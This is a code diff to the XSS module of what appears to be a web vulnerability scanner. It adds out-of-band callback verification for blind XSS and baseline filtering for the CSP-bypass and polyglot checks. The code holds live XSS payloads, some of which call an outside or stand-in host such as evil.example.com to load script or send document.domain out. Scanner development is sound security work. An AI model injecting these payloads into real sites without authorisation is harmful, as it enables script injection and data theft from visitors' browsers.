@@ -106,25 +106,67 @@ class XSSModule(BaseModule):
                 continue
 
     def _test_blind_xss(self, url: str, method: str, param: str, value: str):
-        """Test for blind XSS via callback"""
-        cb = self.engine.config.get("callback_domain", "xss.callback.example.com")
-        payloads = [
-            f'"><script src=https://{cb}/x></script>',
-            f"'><img src=x onerror=fetch('https://{cb}/'+document.domain)>",
-        ]
-        for payload in payloads:
+        """Test for blind XSS via callback.
+
+        A blind XSS payload only fires inside a victim's browser when
+        the stored output is rendered later — there is no synchronous
+        signal in the immediate HTTP response.  The previous
+        implementation reported a finding on EVERY request that
+        returned without an exception, which generated one false
+        positive per parameter regardless of whether the payload was
+        accepted, encoded, dropped, or even reflected.
+
+        Correct verification requires an out-of-band listener: inject
+        a payload carrying a unique callback URL, then poll the
+        listener for a hit.  We only emit a finding when the listener
+        actually receives the callback.
+
+        When no OOB infrastructure is wired into the engine the test
+        is a no-op — silent absence is preferable to noisy false
+        positives.
+        """
+        oob_manager = getattr(self.engine, "oob_manager", None)
+        if oob_manager is None or not getattr(oob_manager, "enabled", False):
+            return
+
+        for template in (
+            '"><script src=https://{host}/x.js></script>',
+            "'><img src=x onerror=fetch('https://{host}/'+document.domain)>",
+        ):
             try:
+                token, callback_url = oob_manager.get_callback_url(
+                    vuln_type="xss_blind", url=url, param=param,
+                )
+                if not token or not callback_url:
+                    continue
+
+                from urllib.parse import urlparse as _urlparse
+                callback_host = _urlparse(callback_url).hostname or token
+                payload = template.format(host=callback_host)
+
                 self.requester.request(url, method, data={param: payload})
+
+                # Poll the listener: real blind XSS triggers later (when
+                # an admin/user visits the rendered page), so a short
+                # timeout will rarely fire — that's acceptable.  We
+                # surface a finding ONLY on a real hit.
+                hits = oob_manager.check(token, timeout=5)
+                if not hits:
+                    continue
+
                 from core.engine import Finding
 
                 finding = Finding(
                     technique="XSS (Blind XSS Callback)",
                     url=url,
-                    severity="INFO",
-                    confidence=0.3,
+                    severity="HIGH",
+                    confidence=0.95,
                     param=param,
                     payload=payload,
-                    evidence=f"Blind XSS payload injected — verify callback at {cb}",
+                    evidence=(
+                        f"Blind XSS callback received on token {token} "
+                        f"({len(hits)} hit(s)) — payload executed in a victim browser."
+                    ),
                 )
                 self.engine.add_finding(finding)
                 return
@@ -132,7 +174,21 @@ class XSSModule(BaseModule):
                 continue
 
     def _test_csp_bypass(self, url: str, method: str, param: str, value: str):
-        """Test for CSP bypass XSS"""
+        """Test for CSP bypass XSS.
+
+        Compares against a baseline response captured with the original
+        ``value``.  Without baseline filtering, pages that echo the URL
+        or query string verbatim (404 templates, debug pages, search
+        result echoes) trigger a finding for every parameter, since
+        the payload appears in the response only because it was sent
+        — not because it was reflected as executable HTML.
+        """
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
         payloads = [
             '<base href="https://evil.example.com/">',
             '{{constructor.constructor("alert(1)")()}}',
@@ -143,7 +199,10 @@ class XSSModule(BaseModule):
                 response = self.requester.request(url, method, data=data)
                 if not response:
                     continue
-                if payload in response.text:
+                # Only flag when the payload is reflected AND was NOT
+                # already in the baseline (rules out generic echo of
+                # the URL/query string by the page template).
+                if payload in response.text and payload not in baseline_text:
                     from core.engine import Finding
 
                     finding = Finding(
@@ -153,7 +212,7 @@ class XSSModule(BaseModule):
                         confidence=0.7,
                         param=param,
                         payload=payload,
-                        evidence="CSP bypass payload reflected",
+                        evidence="CSP bypass payload reflected (not present in baseline)",
                     )
                     self.engine.add_finding(finding)
                     return
@@ -161,7 +220,19 @@ class XSSModule(BaseModule):
                 continue
 
     def _test_polyglot(self, url: str, method: str, param: str, value: str):
-        """Test for XSS with polyglot payloads"""
+        """Test for XSS with polyglot payloads.
+
+        Same baseline rationale as :meth:`_test_csp_bypass`: pages that
+        echo the URL/query (e.g. 404 pages, search result pages,
+        debug error pages) reflect anything we send and would trigger
+        a finding on every parameter without baseline filtering.
+        """
+        try:
+            baseline_response = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline_response.text if baseline_response else ""
+        except Exception:
+            baseline_text = ""
+
         payloads = [
             "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
             "'-alert()-'",
@@ -177,7 +248,9 @@ class XSSModule(BaseModule):
                 response = self.requester.request(url, method, data=data)
                 if not response:
                     continue
-                if payload in response.text:
+                # Only flag when the payload is reflected AND was NOT
+                # already in the baseline.
+                if payload in response.text and payload not in baseline_text:
                     from core.engine import Finding
 
                     finding = Finding(
@@ -187,7 +260,7 @@ class XSSModule(BaseModule):
                         confidence=0.8,
                         param=param,
                         payload=payload,
-                        evidence="Polyglot XSS payload reflected",
+                        evidence="Polyglot XSS payload reflected (not present in baseline)",
                     )
                     self.engine.add_finding(finding)
                     return
